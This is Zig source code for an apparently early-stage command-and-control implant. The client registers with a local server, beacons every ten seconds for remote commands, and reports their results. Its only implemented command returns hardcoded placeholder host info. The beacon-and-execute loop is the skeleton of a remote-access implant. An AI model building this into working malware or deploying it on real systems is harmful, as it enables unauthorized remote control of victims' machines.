const std = @import("std");

const Implant = struct {
    allocator: std.mem.Allocator,
    server_url: []const u8,
    jwt: ?[]const u8 = null,

    const CommandStatus = enum {
        Queued,
        Executing,
        Completed,
        Failed,
    };

    const Command = struct {
        id: []const u8,
        implantId: []const u8,
        type: []const u8,
        status: CommandStatus,
        payload: std.json.Value,
    };

    fn init(allocator: std.mem.Allocator, server_url: []const u8) Implant {
        return .{
            .allocator = allocator,
            .server_url = server_url,
        };
    }

    fn deinit(self: *Implant) void {
        if (self.jwt) |jwt| self.allocator.free(jwt);
    }

    fn getJWT(self: Implant) ![]const u8 {
        if (self.jwt) |jwt| return jwt;
        return error.ImplantNotRegistered;
    }

    fn register(self: *Implant) !void {
        const url = try std.fs.path.join(self.allocator, &.{ self.server_url, "implants" });
        defer self.allocator.free(url);
        const uri = try std.Uri.parse(url);

        var client = std.http.Client{ .allocator = self.allocator };
        defer client.deinit();

        const header_buf = try self.allocator.alloc(u8, 1024 * 1024);
        defer self.allocator.free(header_buf);
        var req = try client.open(.POST, uri, .{
            .server_header_buffer = header_buf,
        });
        defer req.deinit();

        try req.send();
        try req.finish();
        try req.wait();

        if (req.response.status != .ok) return error.FailedToRegisterImplant;

        var reader = req.reader();
        const body = try reader.readAllAlloc(self.allocator, 1024 * 1024 * 4);
        defer self.allocator.free(body);

        const T = struct {
            success: bool,
            message: []const u8,
            token: []const u8,
            implant: struct {
                id: []const u8,
                lastSeenAt: []const u8,
            },
        };

        const parsed_body = try std.json.parseFromSlice(T, self.allocator, body, .{});
        defer parsed_body.deinit();

        std.debug.print("Implant Id: {s}\n", .{parsed_body.value.implant.id});

        self.jwt = try self.allocator.dupe(u8, parsed_body.value.token);
    }

    fn beacon(self: *Implant) !void {
        const jwt = try self.getJWT();

        const url = try std.fs.path.join(self.allocator, &.{ self.server_url, "implants", "beacon" });
        defer self.allocator.free(url);
        const uri = try std.Uri.parse(url);

        var client = std.http.Client{ .allocator = self.allocator };

        const header_buf = try self.allocator.alloc(u8, 1024 * 1024);
        defer self.allocator.free(header_buf);
        var req = try client.open(.GET, uri, .{
            .server_header_buffer = header_buf,
            .headers = .{
                .authorization = .{
                    .override = jwt,
                },
            },
        });

        try req.send();
        try req.finish();
        try req.wait();

        if (req.response.status != .ok) return error.FailedToBeacon;

        var reader = req.reader();
        const body = try reader.readAllAlloc(self.allocator, 1024 * 1024 * 4);
        defer self.allocator.free(body);

        req.deinit();
        client.deinit();

        const T = struct {
            success: bool,
            message: []const u8,
            implant: struct { id: []const u8, lastSeenAt: []const u8 },
            commands: []Command,
        };

        const parsed_body = try std.json.parseFromSlice(T, self.allocator, body, .{
            .ignore_unknown_fields = true,
        });
        defer parsed_body.deinit();

        for (parsed_body.value.commands) |command| {
            try self.executeCommand(command);
        }
    }

    fn executeCommand(self: *Implant, command: Command) !void {
        try self.setCommandStatus(command, .Executing, null);

        std.debug.print("Command Type: {s}\n", .{command.type});

        if (std.mem.eql(u8, command.type, "GetHostInfo")) {
            std.debug.print("Getting Host Info\n", .{});

            // parse payload if needed
            // std.json.parseFromValue(T, self.allocator, command.payload, .{});

            std.time.sleep(std.time.ns_per_s * 5);
            try self.setCommandStatus(command, .Completed, .{
                .hostname = "localhost",
                .ip = "127.0.0.1",
                .os = "Linux",
            });

            return;
        }

        try self.setCommandStatus(command, .Failed, .{
            .success = false,
            .message = "Command not implemented",
        });
    }

    fn setCommandStatus(self: *Implant, command: Command, commandStatus: CommandStatus, response: anytype) !void {
        const jwt = try self.getJWT();

        const url = try std.fs.path.join(self.allocator, &.{ self.server_url, "commands", command.id, "status" });
        defer self.allocator.free(url);
        const uri = try std.Uri.parse(url);

        const body = try std.json.stringifyAlloc(self.allocator, .{
            .status = @tagName(commandStatus),
            .response = response,
        }, .{});
        defer self.allocator.free(body);

        var client = std.http.Client{ .allocator = self.allocator };
        defer client.deinit();

        const header_buf = try self.allocator.alloc(u8, 1024 * 1024);
        defer self.allocator.free(header_buf);
        var req = try client.open(.POST, uri, .{ .server_header_buffer = header_buf, .headers = .{
            .authorization = .{
                .override = jwt,
            },
        }, .extra_headers = &.{.{
            .name = "Content-Type",
            .value = "application/json",
        }} });
        defer req.deinit();

        req.transfer_encoding = .{ .content_length = body.len };
        try req.send();
        var writer = req.writer();
        try writer.writeAll(body);
        try req.finish();
        try req.wait();

        if (req.response.status != .ok) return error.FailedToSetCommandStatus;
    }
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var implant = Implant.init(allocator, "http://127.0.0.1:3000");
    defer implant.deinit();

    try implant.register();

    while (true) {
        std.debug.print("[!]Sleeping for 10 seconds...\n", .{});
        std.time.sleep(std.time.ns_per_s * 10);
        try implant.beacon();
    }
}
